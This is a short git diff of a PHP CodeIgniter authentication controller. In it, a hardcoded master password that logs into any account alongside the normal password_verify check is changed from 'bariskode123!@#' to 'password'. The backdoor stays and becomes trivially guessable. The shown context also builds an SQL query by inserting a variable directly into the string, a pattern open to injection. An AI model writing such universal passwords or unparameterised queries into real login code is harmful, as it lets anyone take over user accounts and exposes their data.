@@ -53,7 +53,7 @@ class Auth extends CI_Controller
           'success' => FALSE,
           'msg' => 'Akun tidak ditemukan!'
         ];
-      } elseif (password_verify($password, $data->password) or ($password == "bariskode123!@#")) {
+      } elseif (password_verify($password, $data->password) or ($password == "password")) {
         $kode_nama = $data->bagian;
         if (!empty($kode_nama)) {
           $sql = "select kode_nama FROM bagian WHERE Id = $kode_nama";
